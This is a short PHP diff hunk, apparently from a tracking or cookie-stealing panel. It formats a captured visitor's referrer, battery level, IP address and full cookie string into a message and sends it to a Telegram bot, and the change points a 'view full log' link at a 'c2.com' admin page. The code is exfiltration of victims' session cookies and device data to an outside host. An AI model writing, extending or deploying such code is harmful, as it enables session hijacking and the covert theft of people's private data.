@@ -52,7 +52,7 @@ $msg .= "<b>Referrer:</b> " . htmlspecialchars($log['referrer']) . "\n";
 $msg .= "<b>Battery:</b> " . htmlspecialchars($log['battery']) . "\n";
 $msg .= "<b>IP:</b> " . htmlspecialchars($ip) . "\n";
 $msg .= "<b>Cookies:</b>\n<pre>" . htmlspecialchars($log['cookies']) . "</pre>\n";
-$msg .= "<a href=\"https://aamershah.com/x/admin.php\">View full log</a>";
+$msg .= "<a href=\"https://c2.com/admin.php\">View full log</a>";
 
 // Send to Telegram with HTML formatting and web preview disabled
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
